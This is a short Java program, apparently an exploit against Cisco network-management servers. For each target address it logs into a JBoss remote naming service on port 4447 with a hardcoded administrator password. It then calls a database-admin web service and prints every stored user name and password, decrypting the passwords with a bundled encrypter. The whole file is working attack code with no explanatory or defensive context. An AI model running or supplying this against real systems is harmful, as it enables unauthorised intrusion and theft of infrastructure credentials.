/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package NetManager;

/**
 *
 * @author dylo
 */
import com.cisco.dcbu.jaxws.san.ep.DbAdminSEI;
import com.cisco.dcbu.jaxws.wo.DBRowDO;
import com.cisco.dcbu.lib.util.jboss_4_2.JBoss_4_2Encrypter;

import java.util.Properties;

import javax.naming.Context;
import javax.naming.InitialContext;

public class Network {

    public static void main(String[] args) throws Throwable {
        for (String target : args) {
            System.out.println("Target: " + target);

            Properties jndiProps = new Properties();
            jndiProps.put(Context.INITIAL_CONTEXT_FACTORY, "org.jboss.naming.remote.client.InitialContextFactory");
            jndiProps.put(Context.PROVIDER_URL, "remote://" + target + ":4447");
            jndiProps.put(Context.SECURITY_PRINCIPAL, "admin");
            jndiProps.put(Context.SECURITY_CREDENTIALS, "nbv_12345");
            jndiProps.put("jboss.naming.client.ejb.context", true);

            Context ctx = new InitialContext(jndiProps);

            DbAdminSEI i = (DbAdminSEI) ctx.lookup("dcm/jaxws-dbadmin/DbAdminWS!com.cisco.dcbu.jaxws.san.ep.DbAdminSEI");

            for (DBRowDO row : i.getServerProperties(null).getRows()) {
                String propName = row.getEntry()[0];
                String propValue = row.getEntry()[1];

                if (propValue.isEmpty()) {
                    continue;
                }

                if (propName.contains("user")) {
                    System.out.println(propName + " = " + propValue);
                } else if (propName.contains("pass")) {
                    System.out.println(propName + " = " + propValue + " (" + JBoss_4_2Encrypter.decrypt(propValue) + ")");
                }
            }

            System.out.println();
        }
    }
}
